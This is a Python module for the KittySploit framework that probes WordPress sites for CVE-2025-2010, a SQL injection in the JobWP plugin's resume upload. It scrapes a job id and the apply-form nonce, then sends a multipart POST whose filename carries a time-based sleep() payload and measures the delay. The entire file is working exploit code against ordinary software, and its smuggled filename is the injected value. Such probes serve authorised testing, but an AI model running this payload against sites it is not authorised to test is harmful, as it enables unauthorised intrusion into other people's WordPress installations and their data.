#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JobWP CVE-2025-2010 — time-based SQLi probe on resume upload."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "JobWP CVE-2025-2010 SQL injection probe",
        "description": "Runs configurable sleep() injection in jobwp_upload_resume filename.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-2010"],
        "tags": ["wordpress", "jobwp", "sqli", "auxiliary", "cve-2025-2010"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    job_id = OptString("", "Job id", required=False)
    sleep_seconds = OptInteger(8, "SQL sleep seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        jid = (self.job_id or "").strip()
        if not jid:
            r = self.http_request(method="GET", path=self._join("/jobs/"), allow_redirects=True)
            m = re.search(r"/jobs/(\d+)/", r.text or "") if r else None
            jid = m.group(1) if m else ""
        if not jid:
            print_error("job_id required")
            return False
        page = self.http_request(method="GET", path=self._join(f"/jobs/{jid}/"), allow_redirects=True)
        nonce_m = re.search(r'jobwp_apply_form_nonce_field" value="([a-z0-9]+)"', page.text or "") if page else None
        if not nonce_m:
            print_error("Apply nonce not found")
            return False
        sleep_s = int(self.sleep_seconds or 8)
        boundary = "----KittyJobWP"
        fname = f'x\\"*sleep({sleep_s})*\\".pdf'
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_apply_form_nonce_field"\r\n\r\n{nonce_m.group(1)}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_upload_resume"; filename="{fname}"\r\n'
            f"Content-Type: application/pdf\r\n\r\nx\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        start = time.monotonic()
        self.http_request(
            method="POST",
            path=self._join(f"/jobs/{jid}/"),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body,
            timeout=sleep_s + 20,
        )
        elapsed = time.monotonic() - start
        print_status(f"Elapsed: {elapsed:.2f}s")
        return elapsed >= sleep_s - 1
